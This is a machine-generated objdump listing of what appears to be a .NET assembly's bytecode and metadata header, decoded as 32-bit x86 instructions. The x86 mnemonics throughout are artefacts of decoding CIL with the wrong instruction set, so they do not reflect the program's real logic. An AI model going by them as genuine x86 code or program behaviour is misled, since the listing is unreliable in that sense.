  405743:	08 6f ee             	or     %ch,-0x12(%edi)
  405746:	00 00                	add    %al,(%eax)
  405748:	0a 07                	or     (%edi),%al
  40574a:	28 4a 00             	sub    %cl,0x0(%edx)
  40574d:	00 0a                	add    %cl,(%edx)
  40574f:	28 58 00             	sub    %bl,0x0(%eax)
  405752:	00 06                	add    %al,(%esi)
  405754:	0a 02                	or     (%edx),%al
  405756:	06                   	push   %es
  405757:	16                   	push   %ss
  405758:	06                   	push   %es
  405759:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40575c:	4c                   	dec    %esp
  40575d:	00 00                	add    %al,(%eax)
  40575f:	0a 02                	or     (%edx),%al
  405761:	03 16                	add    (%esi),%edx
  405763:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405769:	00 0a                	add    %cl,(%edx)
  40576b:	2a 13                	sub    (%ebx),%dl
  40576d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405770:	21 00                	and    %eax,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	29 00                	sub    %eax,(%eax)
  405776:	00 11                	add    %dl,(%ecx)
  405778:	02 20                	add    (%eax),%ah
  40577a:	cf                   	iret
  40577b:	00 00                	add    %al,(%eax)
  40577d:	00 6f ee             	add    %ch,-0x12(%edi)
  405780:	00 00                	add    %al,(%eax)
  405782:	0a 03                	or     (%ebx),%al
  405784:	28 09                	sub    %cl,(%ecx)
  405786:	01 00                	add    %eax,(%eax)
  405788:	0a 0a                	or     (%edx),%cl
  40578a:	02 06                	add    (%esi),%al
  40578c:	28 58 00             	sub    %bl,0x0(%eax)
  40578f:	00 06                	add    %al,(%esi)
  405791:	16                   	push   %ss
  405792:	1e                   	push   %ds
  405793:	6f                   	outsl  %ds:(%esi),(%dx)
  405794:	4c                   	dec    %esp
  405795:	00 00                	add    %al,(%eax)
  405797:	0a 2a                	or     (%edx),%ch
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 13                	add    %dl,(%ebx)
  40579d:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a0:	35 01 00 00 00       	xor    $0x1,%eax
  4057a5:	00 00                	add    %al,(%eax)
  4057a7:	00 03                	add    %al,(%ebx)
  4057a9:	16                   	push   %ss
  4057aa:	6a 3f                	push   $0x3f
  4057ac:	96                   	xchg   %eax,%esi
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	1f                   	pop    %ds
  4057b2:	7f 6a                	jg     0x40581e
  4057b4:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057b9:	02 03                	add    (%ebx),%al
  4057bb:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a 2a                	or     (%edx),%ch
  4057c2:	03 20                	add    (%eax),%esp
  4057c4:	ff 00                	incl   (%eax)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	6a 3d                	push   $0x3d
  4057ca:	14 00                	adc    $0x0,%al
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	02 20                	add    (%eax),%ah
  4057d0:	cc                   	int3
  4057d1:	00 00                	add    %al,(%eax)
  4057d3:	00 6f ee             	add    %ch,-0x12(%edi)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	0a 02                	or     (%edx),%al
  4057da:	03 d2                	add    %edx,%edx
  4057dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057dd:	ee                   	out    %al,(%dx)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 2a                	or     (%edx),%ch
  4057e2:	03 20                	add    (%eax),%esp
  4057e4:	ff                   	(bad)
  4057e5:	ff 00                	incl   (%eax)
  4057e7:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057ea:	1b 00                	sbb    (%eax),%eax
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	02 20                	add    (%eax),%ah
  4057f0:	cd 00                	int    $0x0
  4057f2:	00 00                	add    %al,(%eax)
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	ee                   	out    %al,(%dx)
  4057f6:	00 00                	add    %al,(%eax)
  4057f8:	0a 02                	or     (%edx),%al
  4057fa:	03 68 28             	add    0x28(%eax),%ebp
  4057fd:	5b                   	pop    %ebx
  4057fe:	00 00                	add    %al,(%eax)
  405800:	06                   	push   %es
  405801:	16                   	push   %ss
  405802:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  405805:	00 00                	add    %al,(%eax)
  405807:	0a 2a                	or     (%edx),%ch
  405809:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  40580f:	00 00                	add    %al,(%eax)
  405811:	02 20                	add    (%eax),%ah
  405813:	ce                   	into
  405814:	00 00                	add    %al,(%eax)
  405816:	00 6f ee             	add    %ch,-0x12(%edi)
  405819:	00 00                	add    %al,(%eax)
  40581b:	0a 02                	or     (%edx),%al
  40581d:	03 69 28             	add    0x28(%ecx),%ebp
  405820:	5a                   	pop    %edx
  405821:	00 00                	add    %al,(%eax)
  405823:	06                   	push   %es
  405824:	16                   	push   %ss
  405825:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405828:	00 00                	add    %al,(%eax)
  40582a:	0a 2a                	or     (%edx),%ch
  40582c:	02 20                	add    (%eax),%ah
  40582e:	d3 00                	roll   %cl,(%eax)
  405830:	00 00                	add    %al,(%eax)
  405832:	6f                   	outsl  %ds:(%esi),(%dx)
  405833:	ee                   	out    %al,(%dx)
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 02                	or     (%edx),%al
  405838:	03 28                	add    (%eax),%ebp
  40583a:	59                   	pop    %ecx
  40583b:	00 00                	add    %al,(%eax)
  40583d:	06                   	push   %es
  40583e:	16                   	push   %ss
  40583f:	1e                   	push   %ds
  405840:	6f                   	outsl  %ds:(%esi),(%dx)
  405841:	4c                   	dec    %esp
  405842:	00 00                	add    %al,(%eax)
  405844:	0a 2a                	or     (%edx),%ch
  405846:	03 20                	add    (%eax),%esp
  405848:	00 00                	add    %al,(%eax)
  40584a:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405850:	00 00                	add    %al,(%eax)
  405852:	02 20                	add    (%eax),%ah
  405854:	d3 00                	roll   %cl,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	6f                   	outsl  %ds:(%esi),(%dx)
  405859:	ee                   	out    %al,(%dx)
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 02                	or     (%edx),%al
  40585e:	03 28                	add    (%eax),%ebp
  405860:	59                   	pop    %ecx
  405861:	00 00                	add    %al,(%eax)
  405863:	06                   	push   %es
  405864:	16                   	push   %ss
  405865:	1e                   	push   %ds
  405866:	6f                   	outsl  %ds:(%esi),(%dx)
  405867:	4c                   	dec    %esp
  405868:	00 00                	add    %al,(%eax)
  40586a:	0a 2a                	or     (%edx),%ch
  40586c:	03 20                	add    (%eax),%esp
  40586e:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  405874:	1b 00                	sbb    (%eax),%eax
  405876:	00 00                	add    %al,(%eax)
  405878:	02 20                	add    (%eax),%ah
  40587a:	d2 00                	rolb   %cl,(%eax)
  40587c:	00 00                	add    %al,(%eax)
  40587e:	6f                   	outsl  %ds:(%esi),(%dx)
  40587f:	ee                   	out    %al,(%dx)
  405880:	00 00                	add    %al,(%eax)
  405882:	0a 02                	or     (%edx),%al
  405884:	03 69 28             	add    0x28(%ecx),%ebp
  405887:	5a                   	pop    %edx
  405888:	00 00                	add    %al,(%eax)
  40588a:	06                   	push   %es
  40588b:	16                   	push   %ss
  40588c:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40588f:	00 00                	add    %al,(%eax)
  405891:	0a 2a                	or     (%edx),%ch
  405893:	03 1f                	add    (%edi),%ebx
  405895:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  405899:	00 00                	add    %al,(%eax)
  40589b:	00 02                	add    %al,(%edx)
  40589d:	20 d1                	and    %dl,%cl
  40589f:	00 00                	add    %al,(%eax)
  4058a1:	00 6f ee             	add    %ch,-0x12(%edi)
  4058a4:	00 00                	add    %al,(%eax)
  4058a6:	0a 02                	or     (%edx),%al
  4058a8:	03 68 28             	add    0x28(%eax),%ebp
  4058ab:	5b                   	pop    %ebx
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	06                   	push   %es
  4058af:	16                   	push   %ss
  4058b0:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058b3:	00 00                	add    %al,(%eax)
  4058b5:	0a 2a                	or     (%edx),%ch
  4058b7:	03 1f                	add    (%edi),%ebx
  4058b9:	e0 6a                	loopne 0x405925
  4058bb:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c0:	02 20                	add    (%eax),%ah
  4058c2:	d0 00                	rolb   $1,(%eax)
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c7:	ee                   	out    %al,(%dx)
  4058c8:	00 00                	add    %al,(%eax)
  4058ca:	0a 02                	or     (%edx),%al
  4058cc:	03 d2                	add    %edx,%edx
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 2a                	or     (%edx),%ch
  4058d4:	02 03                	add    (%ebx),%al
  4058d6:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 2a                	or     (%edx),%ch
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 1b                	add    %bl,(%ebx)
  4058e1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058e4:	61                   	popa
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058ed:	73 4d                	jae    0x40593c
  4058ef:	00 00                	add    %al,(%eax)
  4058f1:	0a 0a                	or     (%edx),%cl
  4058f3:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4058f9:	0b 06                	or     (%esi),%eax
  4058fb:	07                   	pop    %es
  4058fc:	16                   	push   %ss
  4058fd:	1a 6f 45             	sbb    0x45(%edi),%ch
  405900:	00 00                	add    %al,(%eax)
  405902:	0a 26                	or     (%esi),%ah
  405904:	07                   	pop    %es
  405905:	16                   	push   %ss
  405906:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40590a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40590d:	16                   	push   %ss
  40590e:	73 0a                	jae    0x40591a
  405910:	01 00                	add    %eax,(%eax)
  405912:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405918:	00 01                	add    %al,(%ecx)
  40591a:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  40591d:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405920:	08 6f 45             	or     %ch,0x45(%edi)
  405923:	00 00                	add    %al,(%eax)
  405925:	0a 26                	or     (%esi),%ah
  405927:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40592a:	05 dd 1a 00 00       	add    $0x1add,%eax
  40592f:	00 09                	add    %cl,(%ecx)
  405931:	39 06                	cmp    %eax,(%esi)
  405933:	00 00                	add    %al,(%eax)
  405935:	00 09                	add    %cl,(%ecx)
  405937:	6f                   	outsl  %ds:(%esi),(%dx)
  405938:	33 00                	xor    (%eax),%eax
  40593a:	00 0a                	add    %cl,(%edx)
  40593c:	dc 06                	faddl  (%esi)
  40593e:	39 06                	cmp    %eax,(%esi)
  405940:	00 00                	add    %al,(%eax)
  405942:	00 06                	add    %al,(%esi)
  405944:	6f                   	outsl  %ds:(%esi),(%dx)
  405945:	33 00                	xor    (%eax),%eax
  405947:	00 0a                	add    %cl,(%edx)
  405949:	dc 11                	fcoml  (%ecx)
  40594b:	05 2a 00 00 00       	add    $0x2a,%eax
  405950:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  405953:	00 02                	add    %al,(%edx)
  405955:	00 28                	add    %ch,(%eax)
  405957:	00 1c 44             	add    %bl,(%esp,%eax,2)
  40595a:	00 0d 00 00 00 00    	add    %cl,0x0
  405960:	02 00                	add    (%eax),%al
  405962:	07                   	pop    %es
  405963:	00 4a 51             	add    %cl,0x51(%edx)
  405966:	00 0d 00 00 00 00    	add    %cl,0x0
  40596c:	1b 30                	sbb    (%eax),%esi
  40596e:	04 00                	add    $0x0,%al
  405970:	5e                   	pop    %esi
  405971:	00 00                	add    %al,(%eax)
  405973:	00 2e                	add    %ch,(%esi)
  405975:	00 00                	add    %al,(%eax)
  405977:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40597a:	00 00                	add    %al,(%eax)
  40597c:	0a 0a                	or     (%edx),%cl
  40597e:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  405984:	00 0a                	add    %cl,(%edx)
  405986:	0b 06                	or     (%esi),%eax
  405988:	07                   	pop    %es
  405989:	16                   	push   %ss
  40598a:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  40598d:	00 00                	add    %al,(%eax)
  40598f:	0a 06                	or     (%esi),%al
  405991:	17                   	pop    %ss
  405992:	73 0a                	jae    0x40599e
  405994:	01 00                	add    %eax,(%eax)
  405996:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405999:	02 16                	add    (%esi),%dl
  40599b:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a1:	00 0a                	add    %cl,(%edx)
  4059a3:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059a6:	00 00                	add    %al,(%eax)
  4059a8:	0a dd                	or     %ch,%bl
  4059aa:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059af:	39 06                	cmp    %eax,(%esi)
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 08                	add    %cl,(%eax)
  4059b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4059b6:	33 00                	xor    (%eax),%eax
  4059b8:	00 0a                	add    %cl,(%edx)
  4059ba:	dc 06                	faddl  (%esi)
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	dd 00                	fldl   (%eax)
  4059bf:	00 0a                	add    %cl,(%edx)
  4059c1:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059c6:	00 06                	add    %al,(%esi)
  4059c8:	39 06                	cmp    %eax,(%esi)
  4059ca:	00 00                	add    %al,(%eax)
  4059cc:	00 06                	add    %al,(%esi)
  4059ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4059cf:	33 00                	xor    (%eax),%eax
  4059d1:	00 0a                	add    %cl,(%edx)
  4059d3:	dc 09                	fmull  (%ecx)
  4059d5:	2a 00                	sub    (%eax),%al
  4059d7:	00 01                	add    %al,(%ecx)
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 20                	add    %ah,(%eax)
  4059df:	00 16                	add    %dl,(%esi)
  4059e1:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059e8:	02 00                	add    (%eax),%al
  4059ea:	06                   	push   %es
  4059eb:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059ee:	00 0d 00 00 00 00    	add    %cl,0x0
  4059f4:	42                   	inc    %edx
  4059f5:	53                   	push   %ebx
  4059f6:	4a                   	dec    %edx
  4059f7:	42                   	inc    %edx
  4059f8:	01 00                	add    %eax,(%eax)
  4059fa:	01 00                	add    %eax,(%eax)
  4059fc:	00 00                	add    %al,(%eax)
  4059fe:	00 00                	add    %al,(%eax)
  405a00:	0c 00                	or     $0x0,%al
  405a02:	00 00                	add    %al,(%eax)
  405a04:	76 34                	jbe    0x405a3a
  405a06:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a09:	33 30                	xor    (%eax),%esi
  405a0b:	33 31                	xor    (%ecx),%esi
  405a0d:	39 00                	cmp    %eax,(%eax)
  405a0f:	00 00                	add    %al,(%eax)
  405a11:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a17:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	28 1e                	sub    %bl,(%esi)
  405a22:	00 00                	add    %al,(%eax)
  405a24:	24 27                	and    $0x27,%al
  405a26:	00 00                	add    %al,(%eax)
  405a28:	23 53 74             	and    0x74(%ebx),%edx
  405a2b:	72 69                	jb     0x405a96
  405a2d:	6e                   	outsb  %ds:(%esi),(%dx)
  405a2e:	67 73 00             	addr16 jae 0x405a31
  405a31:	00 00                	add    %al,(%eax)
  405a33:	00 4c 45 00          	add    %cl,0x0(%ebp,%eax,2)
  405a37:	00 34 28             	add    %dh,(%eax,%ebp,1)
  405a3a:	00 00                	add    %al,(%eax)
  405a3c:	23 55 53             	and    0x53(%ebp),%edx
  405a3f:	00 80 6d 00 00 10    	add    %al,0x1000006d(%eax)
  405a45:	00 00                	add    %al,(%eax)
  405a47:	00 23                	add    %ah,(%ebx)
  405a49:	47                   	inc    %edi
  405a4a:	55                   	push   %ebp
  405a4b:	49                   	dec    %ecx
  405a4c:	44                   	inc    %esp
  405a4d:	00 00                	add    %al,(%eax)
  405a4f:	00 90 6d 00 00 40    	add    %dl,0x4000006d(%eax)
  405a55:	09 00                	or     %eax,(%eax)
  405a57:	00 23                	add    %ah,(%ebx)
  405a59:	42                   	inc    %edx
  405a5a:	6c                   	insb   (%dx),%es:(%edi)
  405a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5c:	62 00                	bound  %eax,(%eax)
  405a5e:	00 00                	add    %al,(%eax)
  405a60:	00 00                	add    %al,(%eax)
  405a62:	00 00                	add    %al,(%eax)
  405a64:	02 00                	add    (%eax),%al
  405a66:	00 00                	add    %al,(%eax)
  405a68:	57                   	push   %edi
  405a69:	9f                   	lahf
  405a6a:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a6f:	00 00                	add    %al,(%eax)
  405a71:	fa                   	cli
  405a72:	25 33 00 16 00       	and    $0x160033,%eax
  405a77:	00 01                	add    %al,(%ecx)
  405a79:	00 00                	add    %al,(%eax)
  405a7b:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 47 00             	add    %al,0x0(%edi)
  405a86:	00 00                	add    %al,(%eax)
  405a88:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a8d:	00 00                	add    %al,(%eax)
  405a8f:	00 02                	add    %al,(%edx)
  405a91:	00 00                	add    %al,(%eax)
  405a93:	00 0a                	add    %cl,(%edx)
  405a95:	01 00                	add    %eax,(%eax)
  405a97:	00 13                	add    %dl,(%ebx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 31                	add    %dh,(%ecx)
  405a9d:	00 00                	add    %al,(%eax)
  405a9f:	00 02                	add    %al,(%edx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 2e                	add    %ch,(%esi)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 04 00             	add    %al,(%eax,%eax,1)
  405aaa:	00 00                	add    %al,(%eax)
  405aac:	13 00                	adc    (%eax),%eax
  405aae:	00 00                	add    %al,(%eax)
  405ab0:	20 00                	and    %al,(%eax)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	04 00                	add    $0x0,%al
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	03 00                	add    (%eax),%eax
  405aba:	00 00                	add    %al,(%eax)
  405abc:	06                   	push   %es
  405abd:	00 00                	add    %al,(%eax)
  405abf:	00 06                	add    %al,(%esi)
  405ac1:	00 00                	add    %al,(%eax)
  405ac3:	00 02                	add    %al,(%edx)
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 01                	add    %al,(%ecx)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 08                	add    %cl,(%eax)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ad2:	00 00                	add    %al,(%eax)
  405ad4:	01 00                	add    %eax,(%eax)
  405ad6:	00 00                	add    %al,(%eax)
  405ad8:	00 00                	add    %al,(%eax)
  405ada:	d7                   	xlat   %ds:(%ebx)
  405adb:	09 01                	or     %eax,(%ecx)
  405add:	00 00                	add    %al,(%eax)
  405adf:	00 00                	add    %al,(%eax)
  405ae1:	00 06                	add    %al,(%esi)
  405ae3:	00 34 22             	add    %dh,(%edx,%eiz,1)
  405ae6:	40                   	inc    %eax
  405ae7:	19 0a                	sbb    %ecx,(%edx)
  405ae9:	00 51 00             	add    %dl,0x0(%ecx)
  405aec:	f7 1f                	negl   (%edi)
  405aee:	0a 00                	or     (%eax),%al
  405af0:	61                   	popa
  405af1:	22 9e 21 0a 00 e5    	and    -0x1afff5df(%esi),%bl
  405af7:	18 b1 26 06 00 12    	sbb    %dh,0x12000626(%ecx)
  405afd:	1e                   	push   %ds
  405afe:	5d                   	pop    %ebp
  405aff:	14 06                	adc    $0x6,%al
  405b01:	00 31                	add    %dh,(%ecx)
  405b03:	11 f7                	adc    %esi,%edi
  405b05:	1f                   	pop    %ds
  405b06:	0a 00                	or     (%eax),%al
  405b08:	e9 19 f7 1f 0a       	jmp    0xa605226
  405b0d:	00 67 21             	add    %ah,0x21(%edi)
  405b10:	b1 26                	mov    $0x26,%cl
  405b12:	06                   	push   %es
  405b13:	00 b9 22 40 19 0e    	add    %bh,0xe194022(%ecx)
  405b19:	00 62 1b             	add    %ah,0x1b(%edx)
  405b1c:	99                   	cltd
  405b1d:	14 0e                	adc    $0xe,%al
  405b1f:	00 02                	add    %al,(%edx)
  405b21:	22 99 14 06 00 58    	and    0x58000614(%ecx),%bl
  405b27:	25 5d 14 06 00       	and    $0x6145d,%eax
  405b2c:	71 1d                	jno    0x405b4b
  405b2e:	65 24 06             	gs and $0x6,%al
  405b31:	00 b0 19 40 19 0a    	add    %dh,0xa194019(%eax)
  405b37:	00 8c 20 30 00 06 00 	add    %cl,0x60030(%eax,%eiz,1)
  405b3e:	24 00                	and    $0x0,%al
  405b40:	8a 0b                	mov    (%ebx),%cl
  405b42:	12 00                	adc    (%eax),%al
  405b44:	19 00                	sbb    %eax,(%eax)
  405b46:	8f                   	(bad)
  405b47:	1f                   	pop    %ds
  405b48:	12 00                	adc    (%eax),%al
  405b4a:	01 00                	add    %eax,(%eax)
  405b4c:	40                   	inc    %eax
  405b4d:	19 12                	sbb    %edx,(%edx)
  405b4f:	00 67 11             	add    %ah,0x11(%edi)
  405b52:	8f                   	(bad)
  405b53:	1f                   	pop    %ds
  405b54:	06                   	push   %es
  405b55:	00 d2                	add    %dl,%dl
  405b57:	10 40 19             	adc    %al,0x19(%eax)
  405b5a:	06                   	push   %es
  405b5b:	00 8c 14 65 24 06 00 	add    %cl,0x62465(%esp,%edx,1)
  405b62:	7b 1e                	jnp    0x405b82
  405b64:	03 21                	add    (%ecx),%esp
  405b66:	06                   	push   %es
  405b67:	00 02                	add    %al,(%edx)
  405b69:	0f 03 21             	lsl    (%ecx),%esp
  405b6c:	06                   	push   %es
  405b6d:	00 0d 19 a7 05 06    	add    %cl,0x605a719
  405b73:	00 74 12 8f          	add    %dh,-0x71(%edx,%edx,1)
  405b77:	1f                   	pop    %ds
  405b78:	06                   	push   %es
  405b79:	00 e1                	add    %ah,%cl
  405b7b:	12 8f 1f 06 00 91    	adc    -0x6efff9e1(%edi),%cl
  405b81:	11 31                	adc    %esi,(%ecx)
  405b83:	1f                   	pop    %ds
  405b84:	6f                   	outsl  %ds:(%esi),(%dx)
  405b85:	00 af 1f 00 00 06    	add    %ch,0x600001f(%edi)
  405b8b:	00 b9 11 7f 1a 06    	add    %bh,0x61a7f11(%ecx)
  405b91:	00 40 12             	add    %al,0x12(%eax)
  405b94:	7f 1a                	jg     0x405bb0
  405b96:	06                   	push   %es
  405b97:	00 21                	add    %ah,(%ecx)
  405b99:	12 7f 1a             	adc    0x1a(%edi),%bh
  405b9c:	06                   	push   %es
  405b9d:	00 c8                	add    %cl,%al
  405b9f:	12 7f 1a             	adc    0x1a(%edi),%bh
  405ba2:	06                   	push   %es
  405ba3:	00 94 12 7f 1a 06 00 	add    %dl,0x61a7f(%edx,%edx,1)
  405baa:	ad                   	lods   %ds:(%esi),%eax
  405bab:	12 7f 1a             	adc    0x1a(%edi),%bh
  405bae:	06                   	push   %es
  405baf:	00 d0                	add    %dl,%al
  405bb1:	11 7f 1a             	adc    %edi,0x1a(%edi)
  405bb4:	06                   	push   %es
  405bb5:	00 04 12             	add    %al,(%edx,%edx,1)
  405bb8:	7f 1a                	jg     0x405bd4
  405bba:	06                   	push   %es
  405bbb:	00 eb                	add    %ch,%bl
  405bbd:	11 b0 14 06 00 a5    	adc    %esi,-0x5afff9ec(%eax)
  405bc3:	11 70 1f             	adc    %esi,0x1f(%eax)
  405bc6:	06                   	push   %es
  405bc7:	00 76 11             	add    %dh,0x11(%esi)
  405bca:	8f                   	(bad)
  405bcb:	1f                   	pop    %ds
  405bcc:	06                   	push   %es
  405bcd:	00 5d 12             	add    %bl,0x12(%ebp)
  405bd0:	7f 1a                	jg     0x405bec
  405bd2:	06                   	push   %es
  405bd3:	00 3b                	add    %bh,(%ebx)
  405bd5:	0c 5d                	or     $0x5d,%al
  405bd7:	14 06                	adc    $0x6,%al
  405bd9:	00 0e                	add    %cl,(%esi)
  405bdb:	24 40                	and    $0x40,%al
  405bdd:	19 06                	sbb    %eax,(%esi)
  405bdf:	00 4e 23             	add    %cl,0x23(%esi)
  405be2:	40                   	inc    %eax
  405be3:	19 06                	sbb    %eax,(%esi)
  405be5:	00 90 14 65 24 0a    	add    %dl,0xa246514(%eax)
  405beb:	00 02                	add    %al,(%edx)
  405bed:	26 f7 1f             	negl   %es:(%edi)
  405bf0:	06                   	push   %es
  405bf1:	00 5a 19             	add    %bl,0x19(%edx)
  405bf4:	24 26                	and    $0x26,%al
  405bf6:	06                   	push   %es
  405bf7:	00 3f                	add    %bh,(%edi)
  405bf9:	1d 24 26 06 00       	sbb    $0x62624,%eax
  405bfe:	31 14 24             	xor    %edx,(%esp)
  405c01:	26 06                	es push %es
  405c03:	00 08                	add    %cl,(%eax)
  405c05:	1b 40 19             	sbb    0x19(%eax),%eax
  405c08:	0a 00                	or     (%eax),%al
  405c0a:	94                   	xchg   %eax,%esp
  405c0b:	21 4f 22             	and    %ecx,0x22(%edi)
  405c0e:	0a 00                	or     (%eax),%al
  405c10:	e5 22                	in     $0x22,%eax
  405c12:	4f                   	dec    %edi
  405c13:	22 0a                	and    (%edx),%cl
  405c15:	00 ed                	add    %ch,%ch
  405c17:	17                   	pop    %ss
  405c18:	4f                   	dec    %edi
  405c19:	22 0a                	and    (%edx),%cl
  405c1b:	00 59 26             	add    %bl,0x26(%ecx)
  405c1e:	9e                   	sahf
  405c1f:	21 0a                	and    %ecx,(%edx)
  405c21:	00 f1                	add    %dh,%cl
  405c23:	10 9e 21 0a 00 dc    	adc    %bl,-0x23fff5df(%esi)
  405c29:	10 9e 21 06 00 1f    	adc    %bl,0x1f000621(%esi)
  405c2f:	15 40 19 06 00       	adc    $0x61940,%eax
  405c34:	06                   	push   %es
  405c35:	1d 40 19 06 00       	sbb    $0x61940,%eax
  405c3a:	8d 19                	lea    (%ecx),%ebx
  405c3c:	40                   	inc    %eax
  405c3d:	19 0a                	sbb    %ecx,(%edx)
  405c3f:	00 f6                	add    %dh,%dh
  405c41:	20 4f 22             	and    %cl,0x22(%edi)
  405c44:	0a 00                	or     (%eax),%al
  405c46:	b0 20                	mov    $0x20,%al
  405c48:	4f                   	dec    %edi
  405c49:	22 06                	and    (%esi),%al
  405c4b:	00 16                	add    %dl,(%esi)
  405c4d:	21 40 19             	and    %eax,0x19(%eax)
  405c50:	06                   	push   %es
  405c51:	00 0e                	add    %cl,(%esi)
  405c53:	0f 40 19             	cmovo  (%ecx),%ebx
  405c56:	0a 00                	or     (%eax),%al
  405c58:	d7                   	xlat   %ds:(%ebx)
  405c59:	18 9e 21 0a 00 36    	sbb    %bl,0x36000a21(%esi)
  405c5f:	17                   	pop    %ss
  405c60:	b1 26                	mov    $0x26,%cl
  405c62:	0a 00                	or     (%eax),%al
  405c64:	b5 23                	mov    $0x23,%ch
  405c66:	4f                   	dec    %edi
  405c67:	22 0a                	and    (%edx),%cl
  405c69:	00 91 1a f7 1f 0a    	add    %dl,0xa1ff71a(%ecx)
  405c6f:	00 d4                	add    %dl,%ah
  405c71:	20 60 1a             	and    %ah,0x1a(%eax)
  405c74:	06                   	push   %es
  405c75:	00 21                	add    %ah,(%ecx)
  405c77:	13 40 19             	adc    0x19(%eax),%eax
  405c7a:	06                   	push   %es
  405c7b:	00 5a 17             	add    %bl,0x17(%edx)
  405c7e:	5d                   	pop    %ebp
  405c7f:	14 06                	adc    $0x6,%al
  405c81:	00 28                	add    %ch,(%eax)
  405c83:	17                   	pop    %ss
  405c84:	40                   	inc    %eax
  405c85:	19 0a                	sbb    %ecx,(%edx)
  405c87:	00 8b 16 40 19 0a    	add    %cl,0xa194016(%ebx)
  405c8d:	00 be 10 40 19 06    	add    %bh,0x6194010(%esi)
  405c93:	00 4a 1e             	add    %cl,0x1e(%edx)
  405c96:	40                   	inc    %eax
  405c97:	19 06                	sbb    %eax,(%esi)
  405c99:	00 f5                	add    %dh,%ch
  405c9b:	23 5d 14             	and    0x14(%ebp),%ebx
  405c9e:	06                   	push   %es
  405c9f:	00 07                	add    %al,(%edi)
  405ca1:	19 a7 05 06 00 e6    	sbb    %esp,-0x19fff9fb(%edi)
  405ca7:	1e                   	push   %ds
  405ca8:	5d                   	pop    %ebp
  405ca9:	14 0a                	adc    $0xa,%al
  405cab:	00 aa 0e 9e 21 06    	add    %ch,0x6219e0e(%edx)
